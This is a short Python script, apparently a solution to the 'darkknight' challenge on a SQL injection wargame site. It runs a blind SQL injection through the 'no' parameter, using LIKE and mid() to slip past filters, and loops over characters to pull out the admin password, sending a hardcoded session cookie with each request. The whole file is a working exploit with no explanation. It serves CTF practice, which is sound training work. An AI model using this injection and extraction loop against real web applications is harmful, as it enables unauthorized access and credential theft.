import requests as req
pwd = ""
cookies = {'PHPSESSID':'5cbi4j1nqp56sico0e7i70lddb'}
string = "1234567890abcdefghijklmnopqrstuvwxyz"
for i in range(1, 9):
    for j in string:
        url = f'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&no=1 or 1 like 1 and id like "admin" and mid(pw,{i},1) like "{j}" -- '
        res = req.get(url=url, cookies=cookies)
        if 'Hello admin' in res.text:
            pwd += j

print(pwd)